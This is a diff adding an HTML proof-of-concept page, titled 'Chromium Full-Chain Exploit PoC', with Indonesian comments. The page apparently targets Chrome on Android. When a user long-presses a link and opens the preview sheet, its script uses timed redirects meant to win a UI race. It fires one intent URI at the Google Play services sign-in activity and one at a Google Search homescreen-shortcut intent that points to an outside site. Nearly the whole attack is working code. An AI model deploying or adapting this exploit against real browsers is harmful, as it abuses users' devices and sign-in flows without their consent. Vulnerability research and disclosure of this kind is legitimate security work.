@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chromium Full-Chain Exploit PoC</title>
+  <style>
+    :root {
+      --bg: #090d16;
+      --card: #111827;
+      --accent: #ef4444;
+      --accent-hover: #dc2626;
+      --text: #f9fafb;
+      --text-muted: #9ca3af;
+    }
+
+    body {
+      font-family: system-ui, -apple-system, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      margin: 0;
+      display: grid;
+      place-content: center;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .wrapper {
+      background: var(--card);
+      padding: 40px 30px;
+      border-radius: 20px;
+      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 10px 10px -5px rgba(0, 0, 0, 0.4);
+      max-width: 420px;
+      width: 100%;
+      border: 1px solid rgba(239, 68, 68, 0.2);
+    }
+
+    h2 {
+      margin-top: 0;
+      font-size: 1.4rem;
+      color: #f87171;
+      letter-spacing: -0.025em;
+    }
+
+    p {
+      color: var(--text-muted);
+      font-size: 0.9rem;
+      line-height: 1.5;
+      margin-bottom: 28px;
+    }
+
+    .target-btn {
+      display: block;
+      width: 100%;
+      box-sizing: border-box;
+      padding: 16px;
+      background: var(--accent);
+      color: white;
+      text-decoration: none;
+      font-weight: 700;
+      font-size: 0.95rem;
+      border-radius: 12px;
+      transition: background 0.2s, transform 0.1s;
+      box-shadow: 0 4px 14px rgba(239, 68, 68, 0.4);
+    }
+
+    .target-btn:active {
+      background: var(--accent-hover);
+      transform: scale(0.97);
+    }
+
+    .hud {
+      margin-top: 24px;
+      padding: 12px;
+      background: rgba(3, 7, 18, 0.8);
+      border-radius: 10px;
+      font-family: monospace;
+      font-size: 0.75rem;
+      color: #fca5a5;
+      border: 1px solid rgba(239, 68, 68, 0.2);
+      text-align: left;
+      max-height: 80px;
+      overflow-y: auto;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="wrapper">
+    <h2>Full-Chain Exploit PoC</h2>
+    <p>Long-press target, select <b>Preview page</b>, and observe the chained background intent escalation.</p>
+    
+    <!-- Target link untuk memicu contextmenu / preview flow -->
+    <a href="https://www.google.com" id="chainLink" class="target-btn">
+      Execute Full-Chain Vector
+    </a>
+
+    <div class="hud" id="hudLog">[+] Status: Awaiting long-press event...</div>
+  </div>
+
+  <script>
+    const link = document.getElementById("chainLink");
+    const log = document.getElementById("hudLog");
+    let executionState = 0;
+
+    function appendLog(msg) {
+      log.innerHTML += `<br>> ${msg}`;
+      log.scrollTop = log.scrollHeight;
+    }
+
+    // Payload Chain 1: Target intent sistem sensitif / intent resolver pemicu aktivitas latar belakang
+    const primaryIntent = "intent://com.google.android.gms.auth.login.SignInActivity#Intent;scheme=android-app;package=com.google.android.gms;S.browser_fallback_url=https%3A%2F%2Faccounts.google.com;end;";
+    
+    // Payload Chain 2: Fallback secondary intent untuk memaksa system prompt jika primary terblokir sebagian
+    const secondaryIntent = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end;";
+
+    link.addEventListener("pointerdown", () => {
+      if (executionState === 0) {
+        executionState = 1;
+        appendLog("Pointer down captured. Gesture context active.");
+      }
+    }, { passive: true });
+
+    link.addEventListener("contextmenu", (e) => {
+      if (executionState === 2) return;
+      executionState = 2;
+      
+      appendLog("Context menu triggered. Ephemeral Tab flow starting...");
+
+      // Jeda presisi tinggi (2500ms) untuk menunggu Preview Sheet sepenuhnya merender penutup layar
+      setTimeout(() => {
+        appendLog("Firing Chain Step 1: Primary Sensitive Intent...");
+        window.location.href = primaryIntent;
+
+        // Chain Step 2: Rangkaian eksekusi kedua dengan jeda mikro untuk memastikan race condition menangkap celah UI state
+        setTimeout(() => {
+          appendLog("Firing Chain Step 2: Secondary Escalation Vector...");
+          window.location.href = secondaryIntent;
+
+          // Reset status siklus untuk pengujian ulang
+          setTimeout(() => {
+            executionState = 0;
+            appendLog("Chain sequence completed. Ready for re-test.");
+          }, 1500);
+
+        }, 800);
+
+      }, 2500);
+    });
+  </script>
+
+</body>
+</html>
